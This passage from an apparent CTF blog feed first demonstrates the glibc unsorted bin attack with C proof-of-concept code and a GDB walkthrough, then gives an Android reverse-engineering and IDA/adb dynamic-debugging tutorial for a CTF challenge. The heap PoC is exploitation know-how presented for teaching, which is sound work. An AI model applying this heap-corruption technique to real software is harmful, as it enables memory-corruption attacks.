punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当将一个 <code>unsorted bin</code> 取出的时候，会将 <code>bck -&gt; fd</code> 的位置写入本 <code>unsorted bin</code> 的位置</p><p>也就是说，<strong>如果我们控制了 <code>bk</code> 的值，就能将 <code>unsorted_chunks (av)</code> 写到任意地址</strong></p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> target_var <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"bk pointer point to %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*------------VULNERABILITY-----------*/</span>  p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target_var <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//------------------------------------</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%p: %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来，我们通过 GDB 调试分析一下整个过程</p><p>首先分配了两个堆块 <code>chunk1</code> 和 <code>chunk2</code>，其中第二个堆块用来防止与 <code>top chunk</code> 合并</p><p>然后释放 <code>chunk1</code>，将其置于 <code>unsorted bin</code> 中，可以看到其 <code>bk</code> 指针指向 <code>0x00007ffff7dd1b78</code>，由于此时 <code>unsorted bin</code> 只有一个，因此 <code>fd</code> 与 <code>bk</code> 指针相同</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A866.png" alt="CTF - PWN_堆相关的漏洞与利用66.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A873.png" alt="CTF - PWN_堆相关的漏洞与利用73.png"></p><p>假设我们通过堆溢出或其他手段修改 <code>bk</code> 指针，使其指向 <code>target_var - 16</code> 的位置（这里是以 64 位程序作为示例，如果是 32 位程序，则指向 <code>target_var - 8</code> 的位置）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A867.png" alt="CTF - PWN_堆相关的漏洞与利用67.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A872.png" alt="CTF - PWN_堆相关的漏洞与利用72.png"></p><p><code>target_var - 16</code> 处是我们伪造的 <code>chunk</code>，即：<code>target_var</code> 处于伪造 <code>chunk</code> 的 <code>fd</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A868.png" alt="CTF - PWN_堆相关的漏洞与利用68.png"></p><p>然后，我们通过 <code>malloc(400)</code> 再次申请相同大小的空间</p><p>由于所申请的 <code>chunk</code> 处于 <code>small bin</code> 所在的范围，其对应的 <code>bin</code> 中暂时没有 <code>chunk</code>，所以会去 <code>unsorted bin</code> 中找，发现 <code>unsorted bin</code> 不为空，于是把 <code>unsorted bin</code> 中的最后一个 <code>chunk</code> 取出来，而 <code>unsorted bin</code> 中的最后一个 <code>chunk</code> 是我们伪造的 <code>chunk</code></p><p>此时堆并没有什么改变，依然是 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A869.png" alt="CTF - PWN_堆相关的漏洞与利用69.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A871.png" alt="CTF - PWN_堆相关的漏洞与利用71.png"></p><p>但是 <code>0x7fffffffdc88</code>（<code>target_var</code>）地址处已经被修改为 <code>unsorted bin</code> 的链表头部 <code>0x00007ffff7dd1b78</code>，即 <code>fd</code> 指针：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A870.png" alt="CTF - PWN_堆相关的漏洞与利用70.png"></p><blockquote><p>注意：</p><p>虽然我们修改了 <code>target</code> 处的值，但 <code>unsorted bin</code> 链表也可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p></blockquote><p>从上面的示例我们可以看到，<strong>Unsorted bin Attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大</strong>，一般可以作为以下用途：</p><ul><li>我们通过修改循环的次数来使得程序可以执行多次循环  </li><li>我们可以修改 <code>heap</code> 中的 <code>global_max_fast</code> 来使得更大的 <code>chunk</code> 可以被视为 <code>fast bin</code>，这样我们就可以去执行一些 <code>fast bin attack</code> 了</li></ul><hr><h1 id="Large-bin-Attack"><a href="#Large-bin-Attack" class="headerlink" title="Large bin Attack"></a>Large bin Attack</h1><blockquote><p>Large bin Attack 是一类漏洞的利用方法，是指所有基于 <code>large bin</code> 机制的漏洞利用方法</p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">Large Bin Attack - CTF Wiki</a></p></blockquote><p>Large bin Attack 主要利用的是 <code>chunk</code> 进入 <code>bin</code> 中的操作，在 <code>malloc</code> 的时候，遍历 <code>unsorted bin</code> 时，对每一个 <code>chunk</code>，若无法 <code>exact-fit</code> 分配或不满足切割分配的条件，就会将该 <code>chunk</code> 置入相应的 <code>bin</code> 中，而此过程中缺乏对 <code>large bin</code> 的跳表指针的检测</p>]]></content>
    
    
    <summary type="html">主要介绍了堆的一些常见漏洞和利用方法</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向与动态调试</title>
    <link href="https://www.uf4te.cn/posts/13f0410d.html"/>
    <id>https://www.uf4te.cn/posts/13f0410d.html</id>
    <published>2024-05-23T15:45:58.000Z</published>
    <updated>2024-06-05T06:35:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安卓-APK-逆向"><a href="#安卓-APK-逆向" class="headerlink" title="安卓 APK 逆向"></a>安卓 APK 逆向</h1><blockquote><p>Android 的逆向主要分为两个层面：</p><ol><li>Java 层  </li><li>原生层</li></ol><p>Android 逆向常用工具 jadx 下载地址：<a href="https://github.com/skylot/jadx">GitHub - skylot&#x2F;jadx: Dex to Java decompiler</a></p></blockquote><p>首先了解一下 Android：</p><ul><li>Android 也可以看成是 Linux 的一个发行版，但不是 GNU&#x2F;Linux</li><li>Ubuntu、Kali 等也是 Linux 的发行版，但都是基于 GNU&#x2F;Linux 的发行版，它们的应用层用的是 GNU（glibc、libstdc++、GNU CoreUtils 等）</li><li>也就是说，Android 和 Ubuntu、Kali 等基于 GNU&#x2F;Linux 的 Linux 发行版是不一样的，Android 的应用层是自己独有的，不依赖于 GNU</li></ul><hr><h2 id="Java-层"><a href="#Java-层" class="headerlink" title="Java 层"></a>Java 层</h2><blockquote><p>简而言之，就是直接分析 APK 的 <code>MainActivity</code> 方法，不存在其他的链接库调用，一般仅需要掌握 Java 语言即可</p></blockquote><p>用 jadx 打开 apk 程序后，主要方法 <code>MainActivity</code> 通常位于 <code>com.xxx.xxx</code> 下</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%911.png" alt="CTF - REVERSE_Android 逆向1.png"></p><p>对于 <code>MainActivity</code> 中的一些字符串变量，例如：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%912.png" alt="CTF - REVERSE_Android 逆向2.png"></p><p>这里的 <code>C0535R.string.table</code> 可以在如下路径中找到：<code>资源文件/resources.arsc/res/values/strings.xml</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%913.png" alt="CTF - REVERSE_Android 逆向3.png"></p><p>jadx 分析 Android 的 Java 层代码和 IDA 分析 C&#x2F;C++ 程序一样，从 <code>MainActivity</code> 开始一路分析即可</p><blockquote><p>Android 程序 Java 层逆向例题见本站 <em>《<a href="%E3%80%90%E6%A5%9A%E6%85%A7%E6%9D%AF%202023%E3%80%91Level_One.md">【楚慧杯 2023】Level_One</a>》</em></p></blockquote><hr><h2 id="原生层"><a href="#原生层" class="headerlink" title="原生层"></a>原生层</h2><blockquote><p>原生层也叫 Native 层，指的是 Android 操作系统的底层，包括 Linux 内核和各种 C&#x2F;C++ 库</p><p>Native 层通常会使用 <code>so</code> 文件来实现相关的方法，有点类似于 Linux 中的动态链接库，一般需要掌握 Java 语言、C&#x2F;C++ 语言、汇编语言</p></blockquote><p><strong>Android 的 apk 程序实质上也是一个压缩包，我们可以对 apk 程序直接进行解压</strong>（使用 7-zip 或者 WinRAR 都可以）</p><p>然后会得到如下结构的目录：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%914.png" alt="CTF - REVERSE_Android 逆向4.png"></p><p>其实细心一点可以发现，这个目录结构和 jadx 中看到的结构是一样的</p><p>而 <code>so</code> 文件通常在 <code>lib</code> 文件夹下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%915.png" alt="CTF - REVERSE_Android 逆向5.png"></p><blockquote><p><strong>由于 Android 程序需要考虑适配市面上不同手机的 CPU 架构，因此会生成支持不同平台的 <code>so</code> 文件进行兼容</strong></p></blockquote><p>这里每一个文件夹中的 <code>so</code> 文件就对应了一个 CPU 架构</p><p>它们的内容几乎都是一样的，分析其中之一即可，通常是在 IDA 中分析 <code>x86</code> 或 <code>x86_64</code> 架构</p><blockquote><p>Android 程序原生层逆向例题见本站 <em>《<a href="%E3%80%90%E6%A5%9A%E6%85%A7%E6%9D%AF%202023%E3%80%91Level_up.md">【楚慧杯 2023】Level_up</a>》</em></p></blockquote><hr><h3 id="什么是-so"><a href="#什么是-so" class="headerlink" title="什么是 so"></a>什么是 so</h3><blockquote><p>与 Linux 类似，Native 层代码通常存在于 <code>so</code> 文件中，<code>so</code> 文件全称为 Shared Object，使用 <code>so</code> 可以提高开发效率、快速移植</p><p>开发 Android 应用时，有时候 Java 层的编码不能满足实现需求，就需要使用 C&#x2F;C++ 实现，然后生成 so 文件，常见的场景有：加解密算法、音视频编解码等</p></blockquote><p><code>so</code> 文件的加载通常有两种方式：</p><ul><li><code>loadLibrary</code> 加载（<strong>主要使用</strong>）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>   <span class="token comment">// 调用项目中 lib 目录下的 libxxx.so 文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般通过 JNI 来实现</p><blockquote><p>JNI 全名 Java Native Interface，是 Java 本地接口</p><p>JNI 是 Java 调用 Native 语言的一种特性，通过 JNI 可以使 Java 与 C&#x2F;C++ 机型交互，简单点说就是 JNI 是 Java 中调用 C&#x2F;C++ 的统称</p></blockquote><p>在 Android 中 JNI 的实现示例如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%916.png" alt="CTF - REVERSE_Android 逆向6.png"></p><p>这里通过 JNI 从 <code>libSecret_entrance.so</code> 文件中调用了两个方法：  </p><p>① <code>Java_com_example_re11113_jni_getiv(__int64 a1)</code><br>② <code>Java_com_example_re11113_jni_getkey(__int64 a1)</code>  </p><ul><li><code>load</code> 加载（主要用于在插件中加载 <code>so</code> 文件）</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span>   <span class="token comment">// xxx 对应 lib 的绝对路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="IDA-动态调试安卓-so"><a href="#IDA-动态调试安卓-so" class="headerlink" title="IDA 动态调试安卓 so"></a>IDA 动态调试安卓 so</h1><blockquote><p>使用 IDA 动态调试意味着我们要将 apk 运行起来，可以使用模拟器（如：雷电模拟器），也可以使用真实的安卓手机（建议拥有 root 权限）</p><p>当然有 root 的真机最好，用 Android 模拟器来动态调试 <code>so</code> 文件可能无法进行某些步骤</p><p>adb 命令使用方法：<a href="https://zhuanlan.zhihu.com/p/89060003">ADB 命令大全 - 知乎</a></p></blockquote><p>在 IDA 的 <code>dbgsrv</code> 目录下有许多远程调试用的服务程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%917.png" alt="CTF - REVERSE_Android 逆向7.png"></p><p>调试安卓用到的主要是上图红框中的程序，但它们也有区别：</p><ul><li><p><em>真实的安卓手机通常是 ARM 架构，对应 <code>android_server</code> 和 <code>android_server_64</code></em></p></li><li><p><em>模拟器（如：雷电模拟器）通常是 x86 架构，对应 <code>android_x86_server</code> 和 <code>android_x64_server</code></em></p></li></ul><p>我这里主要以雷电模拟器作为例子</p><p>以《2024 WIDC 天融信杯》的《Day2-debug 算法逆向》这道题来说明</p><p>用 jadx 打开 apk，定位到 <code>MainActivity</code>，主要与 <code>getFlag()</code> 函数有关：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9117.png" alt="CTF - REVERSE_Android 逆向17.png"></p><p>函数的定义在 <code>libread.so</code> 文件中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9118.png" alt="CTF - REVERSE_Android 逆向18.png"></p><p>关键加密逻辑在于：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>LABEL_16<span class="token operator">:</span>    v62 <span class="token operator">=</span> v3<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9u</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">45</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5u</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x30</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x19u</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x19u</span> <span class="token punctuation">)</span>        v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1Au</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      v62 <span class="token operator">=</span> <span class="token punctuation">(</span>v62 <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1Au</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v5<span class="token punctuation">[</span>v7<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v62 <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> v7 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> buff<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里对 <code>v62</code> 进行了处理，分别对应 <code>v62</code> 为 <code>0 ~ 9</code>、<code>a ~ z</code> 和 <code>A ~ Z</code> 的情况，循环次数为 <code>v6</code>，最后将加密后的数据与 <code>buff</code> 比较，显然 <code>v5</code> 是明文，<code>buff</code> 是密文</p><p>但是 <code>buff</code> 处并没有内容，因此可能是动态生成的，必须动态调试才能拿到密文</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9119.png" alt="CTF - REVERSE_Android 逆向19.png"></p><p>下载雷电模拟器：<a href="https://www.ldmnq.com/">雷电安卓模拟器-手游模拟器安卓版_android手机模拟器电脑版_雷电模拟器官网</a></p><p><strong>雷电模拟器要开启 root 模式，否则 IDA 找不到要附加的进程</strong></p><p>然后在雷电模拟器的安装路径下，有一个 <code>adb.exe</code> 程序，我这里是 <code>D:\leidian\LDPlayer9</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%919.png" alt="CTF - REVERSE_Android 逆向9.png"></p><p>将该路径加入环境变量，便可以在 CMD 中直接使用 <code>adb</code> 命令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%918.png" alt="CTF - REVERSE_Android 逆向8.png"></p><p>将 apk 程序安装到雷电模拟器，并保证其可以正常运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9110.png" alt="CTF - REVERSE_Android 逆向10.png"></p><p>在 IDA 的 <code>dbgsrv</code> 目录下打开 CMD</p><p>测试一下是否能连接到雷电模拟器：（**一般只要安卓设备连接正确，会自动启动 <code>adb server</code>**）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb devices<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9111.png" alt="CTF - REVERSE_Android 逆向11.png"></p><p>以 root 权限运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9112.png" alt="CTF - REVERSE_Android 逆向12.png"></p><p>将 IDA 的 Android 调试服务程序推送到雷电模拟器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb push android_x64_server /data/local/tmp   <span class="token comment"># 也可以选择推送到其他路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9113.png" alt="CTF - REVERSE_Android 逆向13.png"></p><blockquote><p>注意这里 IDA 的 <code>server</code> 要选对，64 位雷电模拟器一般选择 <code>android_x64_server</code></p></blockquote><p>通过 shell 连接雷电模拟器：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到 <code>/data/local/tmp</code> 目录下赋予 <code>android_x64_server</code> 执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /data/local/tmp <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token function">chmod</span> <span class="token number">777</span> android_x64_server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9114.png" alt="CTF - REVERSE_Android 逆向14.png"></p><p>运行 <code>android_x64_server</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./android_x64_server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9115.png" alt="CTF - REVERSE_Android 逆向15.png"></p><p>如果 <code>android_x64_server</code> 在 23946 端口正常开启监听，说明一切正常</p><p>另外开启一个 CMD，将雷电模拟器的端口转发到本机：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb forward tcp:23946 tcp:23946   <span class="token comment"># 前面是电脑本机的端口，后面是手机的端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了让 IDA 能够发现该 APP，在调试模式打开 APP：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell am start <span class="token parameter variable">-D</span> <span class="token parameter variable">-n</span>  com.ctf.read/com.ctf.read.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体名称可以在 <code>资源文件/AndroidManifest.xml</code> 中查看</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9116.png" alt="CTF - REVERSE_Android 逆向16.png"></p><p>雷电模拟器会弹出等待调试的弹窗：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9120.png" alt="CTF - REVERSE_Android 逆向20.png"></p><p>在 IDA 中使用远程 Linux 调试器：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9121.png" alt="CTF - REVERSE_Android 逆向21.png"></p><p>为了防止 apk 反调试，勾选下图中三个调试选项：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9122.png" alt="CTF - REVERSE_Android 逆向22.png"></p><p><code>Hostname</code> 设置为 127.0.0.1，<code>Port</code> 设置为前面转发到本机的端口号，我这里是 23946</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9123.png" alt="CTF - REVERSE_Android 逆向23.png"></p><blockquote><p>如果报错显示拒绝连接，检查转发端口号是否正确，或者重新转发一次</p></blockquote><p>由于 so 文件无法单独运行，因此我们需要 <code>attach</code> 附加进程</p><p>如果前面没出错的话，在 IDA 的 <code>attach</code> 列表里是可以看到该进程的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9124.png" alt="CTF - REVERSE_Android 逆向24.png"></p><p>找到 <code>buff</code> 存放的地址：<code>0x7FFF5A3772A0</code>，初始时未定义</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9125.png" alt="CTF - REVERSE_Android 逆向25.png"></p><p>设置 jdwp 调试端口</p><p>首先查看一下雷电模拟器中该程序的端口号：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb shell <span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9126.png" alt="CTF - REVERSE_Android 逆向26.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb forward tcp:8700 jdwp:3047   <span class="token comment"># 注意将 3047 端口号修改为自己的</span>jdb <span class="token parameter variable">-connect</span> <span class="token string">"com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9127.png" alt="CTF - REVERSE_Android 逆向27.png"></p><p>然后 IDA 图标会闪烁，回到 IDA 就可以正常 F9、正常下断点了</p><p>运行后，<code>buff</code> 